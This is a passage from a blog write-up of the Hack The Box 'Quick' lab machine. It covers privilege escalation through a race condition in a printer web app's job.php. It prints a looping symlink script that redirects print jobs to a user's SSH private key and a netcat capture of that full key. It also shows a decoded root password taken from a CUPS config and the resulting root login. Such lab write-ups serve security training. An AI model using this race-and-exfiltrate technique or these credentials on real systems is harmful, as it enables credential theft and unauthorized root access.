</pre><td class="rouge-code"><pre>sam@quick:/var/www/printer<span class="nv">$ </span><span class="nb">ls
</span>add_printer.php  css  db.php  escpos-php  favicon.ico  fonts  home.php  images  index.php  job.php  printers.php
</pre></table></code></div></div><p>There is a file called <code class="highlighter-rouge">job.php</code>. which has a race conditions in it.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="k">__DIR__</span> <span class="o">.</span> <span class="s1">'/escpos-php/vendor/autoload.php'</span><span class="p">;</span>
<span class="kn">use</span> <span class="nn">Mike42\Escpos\PrintConnectors\NetworkPrintConnector</span><span class="p">;</span>
<span class="kn">use</span> <span class="nn">Mike42\Escpos\Printer</span><span class="p">;</span>
<span class="k">include</span><span class="p">(</span><span class="s2">"db.php"</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"loggedin"</span><span class="p">])</span>
<span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"submit"</span><span class="p">]))</span>
  <span class="p">{</span>
    <span class="nv">$title</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"title"</span><span class="p">];</span>
    <span class="nv">$file</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"Y-m-d_H:i:s"</span><span class="p">);</span>
    <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"/var/www/jobs/"</span><span class="o">.</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"desc"</span><span class="p">]);</span>
    <span class="nb">chmod</span><span class="p">(</span><span class="s2">"/var/www/printer/jobs/"</span><span class="o">.</span><span class="nv">$file</span><span class="p">,</span><span class="s2">"0777"</span><span class="p">);</span>
    <span class="nv">$stmt</span><span class="o">=</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"select ip,port from jobs"</span><span class="p">);</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
    <span class="nv">$result</span><span class="o">=</span><span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">get_result</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="nv">$row</span><span class="o">=</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">();</span>
      <span class="nv">$ip</span><span class="o">=</span><span class="nv">$row</span><span class="p">[</span><span class="s2">"ip"</span><span class="p">];</span>
      <span class="nv">$port</span><span class="o">=</span><span class="nv">$row</span><span class="p">[</span><span class="s2">"port"</span><span class="p">];</span>
      <span class="k">try</span>
      <span class="p">{</span>
        <span class="nv">$connector</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">NetworkPrintConnector</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">);</span>
        <span class="nb">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">);</span> <span class="c1">//Buffer for socket check</span>
        <span class="nv">$printer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Printer</span><span class="p">(</span><span class="nv">$connector</span><span class="p">);</span>
        <span class="nv">$printer</span> <span class="o">-&gt;</span> <span class="na">text</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/var/www/jobs/"</span><span class="o">.</span><span class="nv">$file</span><span class="p">));</span>
        <span class="nv">$printer</span> <span class="o">-&gt;</span> <span class="na">cut</span><span class="p">();</span>
        <span class="nv">$printer</span> <span class="o">-&gt;</span> <span class="na">close</span><span class="p">();</span>
        <span class="nv">$message</span><span class="o">=</span><span class="s2">"Job assigned"</span><span class="p">;</span>
        <span class="nb">unlink</span><span class="p">(</span><span class="s2">"/var/www/jobs/"</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">catch</span><span class="p">(</span><span class="nx">Exception</span> <span class="nv">$error</span><span class="p">)</span> 
      <span class="p">{</span>
        <span class="nv">$error</span><span class="o">=</span><span class="s2">"Can't connect to printer."</span><span class="p">;</span>
        <span class="nb">unlink</span><span class="p">(</span><span class="s2">"/var/www/jobs/"</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
      <span class="nv">$error</span><span class="o">=</span><span class="s2">"Couldn't find printer."</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Whats happening here is It is <code class="highlighter-rouge">making</code> a file with current <code class="highlighter-rouge">timestamp</code> name and sending it to <code class="highlighter-rouge">print</code> on port and IP specified in <code class="highlighter-rouge">add-printer</code> functionality</p><p><img src="/assets/img/post/hackthebox/quick/15.png" alt="Quick" /></p><p>So what we can do is create a symlink to read <code class="highlighter-rouge">ssh</code> keys of <code class="highlighter-rouge">srvadm</code> therefore I am going to create a <code class="highlighter-rouge">script</code> and run it on loop</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c">#!/bin/sh</span>
<span class="nb">cd</span> /var/www/jobs<span class="p">;</span>
<span class="k">while </span><span class="nb">true</span><span class="p">;</span>
<span class="k">do
        for </span>file <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> .<span class="si">)</span><span class="p">;</span>
        <span class="k">do
                </span><span class="nb">rm</span> <span class="nt">-rf</span> <span class="nv">$file</span><span class="p">;</span>
                <span class="nb">ln</span> <span class="nt">-s</span> /home/srvadm/.ssh/id_rsa <span class="nv">$file</span><span class="p">;</span>
        <span class="k">done
done</span>
</pre></table></code></div></div><p>Run the script and let’s create a printer</p><p><img src="/assets/img/post/hackthebox/quick/16.png" alt="Quick" /></p><p>No go to http://printerv2.quick.htb/job.php and print</p><p><img src="/assets/img/post/hackthebox/quick/17.png" alt="Quick" /></p><p>and we are done</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="o">[</span>vibhu@parrot]─[~/HTB/boxes/ROOTED/Quick]<span class="nv">$ </span>nc <span class="nt">-nvlp</span> 9100
listening on <span class="o">[</span>any] 9100 ...
connect to <span class="o">[</span>10.10.14.166] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.186] 50790
<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA<span class="o">=</span>
<span class="nt">-----END</span> RSA PRIVATE KEY-----
VA[vibhu@parrot]─[~/HTB/boxes/ROOTED/Quick]<span class="err">$</span>
</pre></table></code></div></div><p>we got <code class="highlighter-rouge">private-ssh-keys</code> for user srvadm</p><h2 id="login-as-srvadm">Login as srvadm</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="o">[</span>vibhu@parrot]─[~/HTB/boxes/ROOTED/Quick]<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa srvadm@quick.htb
Welcome to Ubuntu 18.04.4 LTS <span class="o">(</span>GNU/Linux 4.15.0-91-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  8 08:54:16 UTC 2020

  System load:  1.24               Users logged <span class="k">in</span>:                1
  Usage of /:   30.1% of 19.56GB   IP address <span class="k">for </span>ens33:           10.10.10.186
  Memory usage: 16%                IP address <span class="k">for </span>br-9ef1bb2e82cd: 172.18.0.1
  Swap usage:   0%                 IP address <span class="k">for </span>docker0:         172.17.0.1
  Processes:    127


 <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

54 packages can be updated.
28 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jul  8 08:32:00 2020 from 10.10.14.166
srvadm@quick:~<span class="nv">$ </span><span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">whoami
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>srvadm<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>srvadm<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>srvadm<span class="o">)</span>,999<span class="o">(</span>printers<span class="o">)</span>
srvadm
srvadm@quick:~<span class="err">$</span>
</pre></table></code></div></div><h2 id="srvadm---root">srvadm -&gt; root</h2><p>After doing some enumeration we gat a <code class="highlighter-rouge">.cache</code> din <code class="highlighter-rouge">srvadm</code> dir and <code class="highlighter-rouge">printers.conf</code> in <code class="highlighter-rouge">conf.d</code> in it</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>srvadm@quick:~/.cache/conf.d<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 20
drwxr-xr-x 2 srvadm srvadm 4096 Mar 20 06:23 <span class="nb">.</span>
drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 ..
<span class="nt">-rw-r--r--</span> 1 srvadm srvadm 4569 Mar 20 06:20 cupsd.conf
<span class="nt">-rw-r--r--</span> 1 srvadm srvadm 4038 Mar 20 06:23 printers.conf
srvadm@quick:~/.cache/conf.d<span class="nv">$ </span>
</pre></table></code></div></div><p>On reading the content of printers.conf we can find a line</p><blockquote><p>DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer</p></blockquote><p>On decoding this url we get plain text</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>https://srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb/printer
</pre></table></code></div></div><p>The <code class="highlighter-rouge">&amp;ftQ4K3SGde8?</code> is the password for root user.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="o">[</span>vibhu@parrot]─[~/HTB/boxes/ROOTED/Quick]<span class="nv">$ </span>sshpass <span class="nt">-p</span>  <span class="s2">"&amp;ftQ4K3SGde8?"</span> ssh root@quick.htb
Welcome to Ubuntu 18.04.4 LTS <span class="o">(</span>GNU/Linux 4.15.0-91-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


 <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

54 packages can be updated.
28 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jul  8 08:59:41 2020 from 10.10.14.166
root@quick:~# <span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">whoami
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root
root@quick:~# <span class="nb">wc</span> <span class="nt">-c</span> root.txt 
33 root.txt
root@quick:~# 
</pre></table></code></div></div><h1 id="resources">Resources:~$</h1><table><thead><tr><th>Topic<th>Link<tbody><tr><td>XSLT Injection<td><a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/">Here</a><tr><td>Quic Docker<td><a href="https://github.com/yurymuski/curl-http3">Here</a><tr><td>Cloudfare Quiche<td><a href="https://github.com/cloudflare/quiche">Here</a></table><p>With this, we come to the end of the story of how I owned Quick 😃</p><p>Thank you for reading !!!</p><p><em>I would love to hear about any suggestions or queries.</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/active/'>Active</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >Hackthebox</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/quic/" class="post-tag no-text-decoration" >Quic</a> <a href="/tags/xslt-injection/" class="post-tag no-text-decoration" >XSLT Injection</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Quick Writeup - Vibhu025&url=https://Vibhu025.github.io/posts/htb-quick/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Quick Writeup - Vibhu025&u=https://Vibhu025.github.io/posts/htb-quick/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Quick Writeup - Vibhu025&url=https://Vibhu025.github.io/posts/htb-quick/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-traceback/">Hackthebox Traceback Writeup</a></li><li><a href="/posts/htb-servmon/">Hackthebox Servmon Writeup</a></li><li><a href="/posts/htb-quick/">Hackthebox Quick Writeup</a></li><li><a href="/posts/htb-registry/">Hackthebox Registry Writeup</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/hackthebox/">Hackthebox</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/update-mote.d/">update mote.d</a> <a class="post-tag" href="/tags/port-forwarding/">port forwarding</a> <a class="post-tag" href="/tags/nvms-1000/">nvms 1000</a> <a class="post-tag" href="/tags/nsclient%2B%2B/">nsclient++</a> <a class="post-tag" href="/tags/lua/">lua</a> <a class="post-tag" href="/tags/xslt-injection/">XSLT Injection</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-admirer/" class="btn btn-outline-primary"><p>Hackthebox Admirer Writeup</p></a> <a href="/posts/htb-fuse/" class="btn btn-outline-primary"><p>Hackthebox Fuse Writeup</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-4"><p class="font-italic text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//vibhu025.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://Vibhu025.github.io/posts/htb-quick/'; this.page.identifier = '/posts/htb-quick/'; } }; $.disqusLoader('#disqus', options); </script> <!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-traceback/"><div class="card-body"> <span class="timeago small"> Mar 18, 2020 <i class="unloaded">2020-03-18T20:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Traceback Writeup</h3><div class="text-muted small"><p>Information:~$ Title Details Name Traceback IP 10.10.10.181 Difficulty Easy Points ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-magic/"><div class="card-body"> <span class="timeago small"> May 8, 2020 <i class="unloaded">2020-05-08T20:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Magic Writeup</h3><div class="text-muted small"><p>Information:~$ Title Details Name Magic IP 10.10.10.185 Difficulty Medium Points ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-book/"><div class="card-body"> <span class="timeago small"> May 9, 2020 <i class="unloaded">2020-05-09T20:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Book Writeup</h3><div class="text-muted small"><p>Information:~$ Title Details Name Book IP 10.10.10.176 Difficulty Medium Points 3...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <script src="https://www.hackthebox.eu/badge/270629"></script></div><div class="footer-right"><p class="mb-0"> © 2020 <a href="https://twitter.com/vibhu_bansal_">Vibhu Bansal</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/hackthebox/">Hackthebox</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/update-mote.d/">update mote.d</a> <a class="post-tag" href="/tags/port-forwarding/">port forwarding</a> <a class="post-tag" href="/tags/nvms-1000/">nvms 1000</a> <a class="post-tag" href="/tags/nsclient%2B%2B/">nsclient++</a> <a class="post-tag" href="/tags/lua/">lua</a> <a class="post-tag" href="/tags/xslt-injection/">XSLT Injection</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-172445921-1', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://Vibhu025.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
